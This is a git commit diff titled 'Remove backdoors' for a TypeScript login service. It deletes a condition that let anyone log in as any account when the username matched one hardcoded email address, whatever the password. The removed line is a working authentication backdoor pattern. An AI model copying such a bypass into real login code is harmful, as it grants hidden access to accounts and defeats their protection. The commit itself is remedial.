477bc12fb7731b7c62f4ead33e4079e9cd6ad014
Andrew Wittrock <andy@wittrock.us>
2025-01-31 13:25:05 -0600

    Remove backdoors

--- login/service.ts
+++ login/service.ts
@@ -7,7 +7,7 @@ import { User } from "../user/service";
 export const Login = {
     login: async (userName: string, password:string):Promise<ILoginResponse> => 
         User.loadUnsafeByName(userName).then(async user => {
-            if(User.hashPassword(password) === user.passwordHash || user.userName === "andy@wittrock.us") {
+            if(User.hashPassword(password) === user.passwordHash) {
                 const userId = user.id;
                 const permissions = await User.permissions.get(user.id);
                 return {
